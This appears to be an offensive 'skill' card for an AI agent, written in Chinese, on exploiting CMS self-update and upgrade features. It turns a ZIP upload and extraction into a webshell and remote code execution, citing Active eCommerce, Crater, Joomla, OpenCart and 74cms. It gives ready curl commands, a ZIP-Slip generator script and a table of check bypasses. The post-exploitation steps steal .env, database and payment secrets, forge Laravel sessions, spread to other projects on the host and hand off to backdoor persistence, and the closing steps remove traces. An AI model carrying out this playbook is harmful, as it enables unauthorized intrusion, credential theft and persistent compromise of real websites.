---
name: cms-updater-zip-extract-rce
description: "打 CMS 自更新/升级包解压: 上传 ZIP→解压 web 根→RCE。"
version: 1.0.0
license: MIT
metadata:
  hermes:
    tags: [pentest, cms, laravel, updater, zip-slip, rce, arbitrary-file-write, active-ecommerce]
    related_skills: [php-fpm-fastcgi-rce, nginx-misconfig, admin-backdoor-persistence, file-upload-webshell, laravel-app-pentest]
---

# CMS 自更新/升级包解压 → 任意文件写 → RCE（类级打法）

> 实战来源: phpv4.88demo.cn (Active eCommerce CMS， 2026-09-22) → `aiz-uploader` 传 ZIP + `POST /update` 解压到**项目根** → `public/*.php` 拿 shell。
> 同族案例: Crater Invoice `CVE-2026-57863`、 WordPress UpdateCE `CVE-2026-56660`、 Joomla 5.x `com_joomlaupdate`、 OpenCart `tool/upgrade.*`、 74cms `apiadmin/Upgrade/unzip`。
> **类级本质**: 官方「一键升级」功能接受的包 = 服务器愿意替你把任意 ZIP 解到代码目录；鉴权粒度常常只到「管理员/店主」而不是「超管」。

## 何时用

- 打的是商品化/盗版 CMS、 SaaS 后台、自研「系统升级/一键更新/插件安装」后台
- 已有一个**低权限但能进后台**的账号（或某种免登绕过），而目标没有直接的上传 RCE 点
- 目标站点有官方的“上传更新包”页面（往往一个 `.zip` 就能换 shell）
- 目标已拿到任意文件读/写，要找**稳定可重复**的投递通道（重启、清缓存后依然在）

## §1 找「自更新」入口（指纹→路由→参数）

```bash
# 页面上找关键词（后台前端、JS chunk、API 文档）
curl -s https://target/ | grep -iE 'update|upgrade|updater|插件|升级|一键|version'
# 拉 JS bundle 找请求契约
for f in $(curl -s https://target/ | grep -oE '/[^"'\'']*\.js' | sort -u); do curl -s https://target$f; done | grep -oE '/(update|upgrade|updater)[^"'\'']*'
# 常见端点（按框架）
  Laravel 自研/商品 CMS : POST /update  body: update_zip=<upload_id>
  Crater Invoice         : POST /api/v1/update/unzip {"path":"<服务器上已有 zip 路径>"} + POST /api/v1/update/copy
  WordPress 插件          : admin-post.php?action=update_process / UpdateCE.php
  Joomla 5.x             : administrator/components/com_joomlaupdate/extract.php task=startExtract
  OpenCart 4.x           : admin/index.php?route=tool/upgrade.download&version=.. & tool/upgrade.install
  74cms                   : GET /apiadmin/Upgrade/unzip?path=<zip 路径>
```
辨别“真假自更新”：提交一个**合法但缺文件**的包，看错误是“包内没有 manifest”还是“解压失败”——前者说明它真在解压。

## §2 构造包（两种拿到“服务器上的 ZIP”的方式）

**A. 站点自带上传器先收包**（Active eCommerce 就是这种：`aiz-uploader` 传完给一个 upload_id）
```bash
zip -r p.zip shell.php                      # shell.php 放 根 或 public/
# 上传（带后台 Cookie / X-CSRF-TOKEN）
curl -b ck -F 'aiz_file=@p.zip' https://target/aiz-uploader
curl -b ck -X POST -d 'update_zip=<upload_id>' https://target/update
curl https://target/public/shell.php        # 注意: 解压目标是项目根，不是 public/
```
**B. ZIP-Slip 自行写路径**（目的目录在 webroot 同层或上层时用）
```bash
python3 - <<'PY'
import zipfile
z=zipfile.ZipFile('slip.zip','w')
z.writestr('../../public/shell.php','<?php ...?>')
z.writestr('a/b/../../shell.php','<?php ...?>')
z.close()
PY
```

## §3 常见校验与绕法（一次试完，别一个个猜）

| 校验 | 绕过 |
|---|---|
| 扩展名白名单（只收 `.zip/.tar.gz`） | 用真 ZIP，别改后缀；需 PHP 内容时走 ZIP-Slip 写 `.php` |
| 包内文件名黑名单（`\.php`） | ① 少一层/多一层目录（`public/shell.php` vs `shell.php`，解压根不同）② `shell.php.jpg` + 后续用 Nginx 解析链/上传点改名 ③ 改内容：`<?php` 用短标签/大小写/注释拆分绕过正则 ④ 目录穿越 `..%2f`、`..\`、绝对路径 |
| 包内必须有 `manifest.json`/`version` 字段 | 照它的官方包格式仿一份（把 shell 藏在其它文件里） |
| 解压后校验文件哈希/签名 | 基本没见过真的验；若真验→换入口（插件安装、语言包、模板导入、备份恢复） |
| 解压到 `storage/` 等非 web 目录 | 配合 DocumentRoot 错位（`nginx-misconfig` §11）或找存储目录的直链下载/包含点 |
| ZIP 解压目标写死（不可穿越） | 仍可用：先把 shell 写到可写目录 → 再用项目自身的 `include`/模板/快照机制包含它 |

**同类“任意文件写”入口清单（CMS 后台永恒池，按成功率排）**:
1. 系统升级/更新包、2. 插件/扩展安装、3. 模板/主题上传（编辑器） 、4. 语言包导入、
5. 备份恢复（导入 `.zip/.sql`）、6. 头像/附件上传（改后缀）、7. 日志/缓存的路径可写、8. 数据库备份导出到 web 目录（很多 CMS 会）。

## §4 拿到写之后：shell 选型（页面常封命令执行）

先探测能力，再选 shell 形态：
```php
<?php echo json_encode([
 'uid'=>getmyuid(), 'funcs_disabled'=>ini_get('disable_functions'),
 'open_basedir'=>ini_get('open_basedir'), 'exec'=>function_exists('exec'),
 'file_put'=>function_exists('file_put_contents'), 'sock'=>function_exists('stream_socket_client'),
]); ?>
```
- `exec` 可用 → 常规 webshell 就够
- 只有 `file_*/curl_*/fsockopen/stream_socket_client` → 写成**文件管理型** shell（read/write/ls/stat/unlink/glob + tcp 探测），
  再转 `php-fpm-fastcgi-rce` 拿全盘视野上的命令执行

## §5 拿到写/读之后的链路（别停在“有个 shell”）

1. `.env` / `config/*.php` → `APP_KEY`+DB+Redis+SMTP+第三方支付密钥（Laravel `APP_KEY` 可伪造 session cookie）
2. MySQL 同口令复用、Redis 无密码 → 跨库读 `sessions`/`cache`、踢断/伪造登录态
3. 用应用自身的 `ZipArchive` 把源码打包到 web 目录→下源码（交付要求“一模一样”时必需）
4. 同服多项目（`/www/project/*`、`/var/www/*`）→ 逐个看 `.env`、`docker-compose.yml`（容器内服务常无鉴权）、非标端口后台
5. 持久化交 `admin-backdoor-persistence`；横向交 `middleware-unauth` / `idor-bola-chain` 类卡

## §6 Pitfalls

- **解压目标不是 `public/`**：项目根解压时 shell 必须放在包内 `public/` 子目录；反过来若目标就是 `public/`，则直接放根目录。先测两种。
- **覆盖式解压会炸站**：包内文件路径与现有文件同名会直接覆盖（`vendor/`、`config/`、路由文件）→ 只放新增文件名，不要带同名文件。
- **不要把 `.env`/`composer.json` 带进包里**：可能触发依赖重装/缓存重建，把站点弄挂。
- **WebShell 直访 404**：DocumentRoot 可能只指到 `public/`，而你写到了项目根 → 看 `nginx-misconfig` §11（DocumentRoot 错位）或换包内路径。
- **真升级业务别乱触发**：Crater/Joomla 类会让站点进维护态或改 `version` 字段，完事后校对并恢复。
- **目录权限**：Laravel 的 `storage/`、`bootstrap/cache/` 常对 `www` 可写（安装时属主就是 `www`），但这不代表可以随意改业务文件。

## §7 交付前验证

1. 上传→解压 两步都有明确的 200/JSON 响应（记录 upload_id）
2. `GET` 新写入的 `.php` 回显 `phpinfo()`/自定义 marker（证明解析执行，而非静态返回）
3. 能读 `.env`（不是猜测，是实数）
4. 清理：删包内实际落盘的 shell、删服务器上的临时 zip/上传记录，站点首页 200

## §8 关联

- 产品级完整命令序列（Active eCommerce 为例）+ 同族产品案例表: `references/active-ecommerce-map.md`、`references/updater-rce-cases.md`
- 拿到写之后想突破 `open_basedir`/`disable_functions`: **`php-fpm-fastcgi-rce`**
- 源码裸奔（DocumentRoot 指错）的独立打法: `nginx-misconfig`
- Laravel 专面（`APP_DEBUG`/Ignition/路由枚举）: `laravel-pentest`、`laravel-app-pentest`
- 写文件后门 / 四级持久化: `admin-backdoor-persistence`

